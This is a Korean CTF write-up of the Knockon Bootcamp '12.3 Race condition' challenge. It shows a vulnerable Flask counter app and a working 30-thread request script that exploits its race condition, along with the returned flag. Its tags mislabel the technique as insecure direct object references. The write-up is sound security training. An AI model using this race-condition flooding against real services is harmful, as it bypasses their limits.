---
title: "[Writeup] Knockon Bootcamp - 12.3 Race condition"
categories:
  - Web Hacking
tags:
  - Writeup
  - Knockon Bootcamp
  - Insecure Direct Object References
last_modified_at: 2024-09-16T20:30:00-05:00
published: true
---

|

## 문제

<http://war.knock-on.org:10015/>

![12.3 Race condition 1](/assets/images/writeup/web-hacking/knock-on/12-3_RACE_1.png)

![12.3 Race condition 2](/assets/images/writeup/web-hacking/knock-on/12-3_RACE_2.png)

|

|

|

### 목표

---

다른 사용자의 리소스를 참조를 통해 flag 얻기

|

### 공격 기법

---

Insecure Direct Object References

|

|

|

## 문제 코드

```python
from flask import Flask, render_template
from time import sleep
import os

flag = os.getenv("FLAG")
app = Flask(__name__)

counter = 0

@app.route("/increase")
def increase():
    global counter

    if counter < 15:
        sleep(0.1)
        counter += 1
        return render_template("index.html", counter=counter, message="Increased++")
    elif counter > 15:
        return render_template(
            "index.html", counter=counter, message="Success!!\t" + flag
        )
    else:
        return render_template("index.html", counter=counter, message="Denied##")

@app.route("/reset")
def reset():
    global counter
    counter = 0
    return render_template("index.html", counter=counter)

@app.route("/")
def index():
    global counter
    return render_template("index.html", counter=counter)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, threaded=True)
```

|

|

|

## 분석

![12.3 Race condition 3](/assets/images/writeup/web-hacking/knock-on/12-3_RACE_3.png)

`increase` 버튼을 누르면 숫자가 하나씩 올라감

|

![12.3 Race condition 4](/assets/images/writeup/web-hacking/knock-on/12-3_RACE_4.png)


15에서 더 이상 안 올라감

|

|

|

## 코드 분석

### increase()

```python
@app.route("/increase")
def increase():
    global counter

    if counter < 15:
        sleep(0.1)
        counter += 1
        return render_template("index.html", counter=counter, message="Increased++")
    elif counter > 15:
        return render_template(
            "index.html", counter=counter, message="Success!!\t" + flag
        )
    else:
        return render_template("index.html", counter=counter, message="Denied##")
```

`/increase`경로로 GET요청이 올 때마다 실행됨

`counter`가 `15 이상`이 되면 `flag`를 줌

조건은 `15보다 작을 때`와 `15보다 클 때`밖에 없기 때문에, `15에서 16`으로 넘어가려고 하면 `else`문이 실행됨

|

|

```python
if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000, threaded=True)
```

`threaded=True`: 멀티스레딩 모드. 동시에 여러 요청을 처리할 수 있음. `Race Condition` 공격 가능

|

|

|

## Exploit

### Race Condition 공격 코드 작성

```python
import threading
import requests
```

멀티스레딩 사용을 위해 `threading`, HTTP 요청을 위해 `requests` 라이브러리 추가

|

```python
url = "http://war.knock-on.org:10015/increase" 
```

서버 url 설정

|

```python
def increase_counter():
    try:
        response = requests.get(url)
        print(response.text) # 서버 응답
    except Exception as e:
        print(e)
```

`url`에 `GET`요청을 보내고 응답을 `response`에 저장 후 출력

|

```python
threads = []

for _ in range(30): # 스레드 30개 생성
    thread = threading.Thread(target=increase_counter)
    threads.append(thread)
    thread.start()
```

`thread = threading.Thread(target=increase_counter)`: `target`으로 실행할 함수 지정, 생성된 각 스레드들이 해당 함수를 실행함

|

```python
for thread in threads:
    thread.join()
```

모든 스레드가 종료될 떄까지 기다림

|

|

### 결과

---

```html
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Counter</title>
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
</head>

<body>
    <div class="container mt-5">
        <h2>Counter</h2>

        
        <div class="alert alert-info" role="alert">
            30
        </div>
        

        <a href="/increase" class="btn btn-primary">increase</a>
        <a href="/reset" class="btn btn-primary">reset</a>

        
        <div class="alert alert-info" role="alert">
            Success!!	K0{Cl1ck_m00oor3_F4st3r_t0_3XPL01T!!!}
        </div>
        
    </div>
</body>
```

|

|

|

## Payload

```python
import threading
import requests

url = "http://war.knock-on.org:10015/increase" 

def increase_counter():
    try:
        response = requests.get(url)
        print(response.text) # 서버 응답
    except Exception as e:
        print(e)

threads = []

for _ in range(30):
    thread = threading.Thread(target=increase_counter)
    threads.append(thread)
    thread.start()

for thread in threads:
    thread.join()
```

|

|

### FLAG

```bash
K0{Cl1ck_m00oor3_F4st3r_t0_3XPL01T!!!}
```

|

---